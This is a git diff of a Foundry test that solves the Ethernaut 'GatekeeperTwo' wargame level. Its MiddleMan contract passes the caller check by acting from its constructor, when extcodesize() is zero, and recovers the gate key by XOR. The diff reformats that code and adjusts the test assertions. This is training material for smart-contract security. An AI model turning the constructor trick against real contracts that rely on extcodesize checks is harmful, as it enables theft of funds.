@@ -4,10 +4,14 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import "src/openzeppelin-ethernaut/GatekeeperTwo.sol";
 
-// exploit constructor s.t. extcodesize() is 0. Reverse cal. the answer directly
+// 1. use constructor s.t. extcodesize() is 0
+// 2. reverse cal. the answer using xor's self-inverse property
 contract MiddleMan {
     constructor(address prey) {
-        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
+        bytes8 gateKey = bytes8(
+            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
+                type(uint64).max
+        );
         GatekeeperTwo(prey).enter(gateKey);
     }
 }
@@ -21,7 +25,9 @@ contract GatekeeperTwoTest is Test {
     }
 
     function test() public {
+        assertEq(instance.entrant(), address(0));
+
         new MiddleMan(address(instance));
-        assertEq(instance.entrant(), msg.sender);
+        assertEq(instance.entrant(), tx.origin);
     }
 }
